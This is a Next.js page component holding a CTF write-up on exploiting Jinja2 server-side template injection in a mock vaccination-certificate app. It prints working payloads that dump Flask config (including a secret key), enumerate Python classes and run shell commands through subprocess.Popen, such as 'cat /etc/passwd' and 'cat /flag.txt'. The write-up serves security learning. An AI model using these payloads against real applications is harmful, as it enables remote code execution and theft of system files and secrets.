import WriteUpTemplate from "../components/WriteUpTemplate";
import Image from "next/image";

export default function JinjaCareWriteUp() {
  return (
    <WriteUpTemplate
      title="JinjaCare"
      category="Bug Bounty CTF"
    >
      <div className="space-y-8">
        <section>
          <h2 className="text-2xl font-bold mb-4">Context</h2>
          <p className="text-neutral-300">
            JinjaCare is a web application designed to help citizens manage and access their COVID-19 vaccination records. 
            The platform allows users to store their vaccination history and generate digital certificates. 
            They&apos;ve asked you to hunt for any potential security issues in their application and retrieve the flag stored in their site.
          </p>
          
          <div className="mt-4">
            <h3 className="text-lg font-semibold mb-2">📝 Related Bug Bounty Reports</h3>
            <ul className="list-disc list-inside space-y-2">
              <li>
                <strong>Bug Report #1</strong> - <a href="https://hackerone.com/reports/125980" className="text-blue-400 hover:text-blue-300" target="_blank" rel="noopener noreferrer">RCE via SSTI</a>
              </li>
              <li>
                <strong>Bug Report #2</strong> - <a href="https://hackerone.com/reports/1104349" className="text-blue-400 hover:text-blue-300" target="_blank" rel="noopener noreferrer">SSTI</a>
              </li>
            </ul>
          </div>
        </section>

        <section>
          <h2 className="text-2xl font-bold mb-4">Summary of the Reports</h2>
          
          <div className="space-y-6">
            <div>
              <h3 className="text-xl font-semibold mb-2">Report #125980 – RCE via SSTI in Flask/Jinja2</h3>
              <ul className="list-disc list-inside space-y-2 text-neutral-300">
                <li>Target used Flask + Jinja2</li>
                <li>An endpoint rendered user input directly into a template</li>
                <li>Payload: <code className="bg-black/50 px-2 py-1 rounded">{`{{''.__class__.__mro__[2].__subclasses__()}}`}</code> used to enumerate classes</li>
                <li>Found the <code className="bg-black/50 px-2 py-1 rounded">subprocess.Popen</code> class and used it to get RCE via:
                  <pre className="bg-black/50 p-4 rounded-lg mt-2 overflow-x-auto">
                    <code>{`{{''.__class__.__mro__[2].__subclasses__()[<INDEX>](["id"], shell=True, stdout=-1).communicate()}}`}</code>
                  </pre>
                </li>
              </ul>
            </div>

            <div>
              <h3 className="text-xl font-semibold mb-2">Report #1104349 – SSTI in PDF Generation</h3>
              <ul className="list-disc list-inside space-y-2 text-neutral-300">
                <li>Vulnerability found in certificate PDF generation</li>
                <li>Attacker submitted a malicious name value like:
                  <pre className="bg-black/50 p-4 rounded-lg mt-2 overflow-x-auto">
                    <code>{`{{7*7}}`}</code>
                  </pre>
                </li>
                <li>PDF generation rendered the user&apos;s name using Jinja2</li>
                <li>Resulting PDF showed <code className="bg-black/50 px-2 py-1 rounded">49</code>, confirming SSTI</li>
                <li>Later escalated to RCE using the same class chain payload:
                  <pre className="bg-black/50 p-4 rounded-lg mt-2 overflow-x-auto">
                    <code>{`{{''.__class__.__mro__[2].__subclasses__()[index]('cat /etc/passwd', shell=True, stdout=-1).communicate()[0].decode()}}`}</code>
                  </pre>
                </li>
              </ul>
            </div>
          </div>
        </section>

        <section>
          <h2 className="text-2xl font-bold mb-4">Exploitation</h2>
          <p className="text-neutral-300 mb-4">
            First, to escalate privileges, I created an account. Later I saw input fields valuable for the SSTI vulnerability. 
            There is one specific field which was vulnerable to revealing information in the certificate.
          </p>

          <div className="space-y-6">
            <div>
              <h3 className="text-xl font-semibold mb-2">Initial Payload Testing</h3>
              <div className="space-y-4">
                <div>
                  <p className="font-semibold mb-2">Payload 1:</p>
                  <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
                    <code>{`{{ config }}`}</code>
                  </pre>
                </div>
                
                <div>
                  <p className="font-semibold mb-2">Response:</p>
                  <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto text-sm">
                    <code>{`Name: <Config {'DEBUG': True, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': '60eafc7593c192b34aaca09a60cbaa34fee7266e059c0aea79c9000bb24aed47', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}> Vaccination Status: Fully Vaccinated Date of Issue: 2025-06-27`}</code>
                  </pre>
                </div>
              </div>
            </div>

            <div>
              <h3 className="text-xl font-semibold mb-2">Class Enumeration</h3>
              <p className="text-neutral-300 mb-4">When attempting to enumerate classes:</p>
              <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto mb-4">
                <code>{`{{''.__class__.__mro__[2].__subclasses__()}}`}</code>
              </pre>
              <p className="text-neutral-300 mb-4">The response was:</p>
              <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
                <code>Error generating certificate: tuple object has no element 2</code>
              </pre>
            </div>

            <div>
              <h3 className="text-xl font-semibold mb-2">Further Enumeration</h3>
              <p className="text-neutral-300 mb-4">Using the following payloads:</p>
              <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto mb-4">
                <code>{`{{ ''.__class__.__mro__[1].__subclasses__()[0].__name__ }}
{{ ''.__class__.__mro__[1].__subclasses__()[1].__name__ }}
{{ ''.__class__.__mro__[1].__subclasses__()[2].__name__ }}`}</code>
              </pre>
              <p className="text-neutral-300 mb-4">Returned:</p>
              <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
                <code>weakref
weakcallableproxy
weakproxy</code>
              </pre>
            </div>

            <div>
              <h3 className="text-xl font-semibold mb-2">Finding Popen</h3>
              <p className="text-neutral-300 mb-4">Used a loop to find popen:</p>
              <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
                <code>{`{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {{ loop.index0 }} - {{ c.__name__ }}<br>
{% endfor %}`}</code>
              </pre>
            </div>

            <div>
              <h3 className="text-xl font-semibold mb-2">Final Exploitation</h3>
              <p className="text-neutral-300 mb-4">Used the following payload to reveal the flag:</p>
              <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
                <code>{`{{ ''.__class__.__mro__[1].__subclasses__()[359]('cat /flag.txt', shell=True, stdout=-1).communicate()[0].decode() }}`}</code>
              </pre>
              <p className="text-neutral-300 mt-4">This revealed the flag in the certificate!</p>
              
              <div className="mt-6 rounded-lg overflow-hidden border border-neutral-800">
                <Image
                  src="/ctfflag.png"
                  alt="JinjaCare Certificate showing the captured flag"
                  width={1200}
                  height={800}
                  className="w-full"
                  priority
                />
              </div>
            </div>
          </div>
        </section>
      </div>
    </WriteUpTemplate>
  );
} 